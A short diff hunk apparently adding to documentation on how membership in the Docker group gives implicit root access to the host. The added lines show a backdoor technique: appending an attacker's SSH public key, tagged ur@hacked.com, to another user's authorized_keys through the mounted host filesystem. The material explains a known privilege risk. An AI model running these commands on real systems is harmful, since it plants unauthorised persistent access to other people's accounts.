@@ -86,6 +86,11 @@ implict access via:
     chmod 600 50-taro
     exit
 
+    #   Or, more subtly, if another user has sudo without password:
+    cat >> /host/home/adminuser/.ssh/authorized_keys
+    ssh-rsa AAAA.... ur@hacked.com
+    ^D
+
 
 
 [ditm]: https://container-solutions.com/docker-inspect-template-magic/
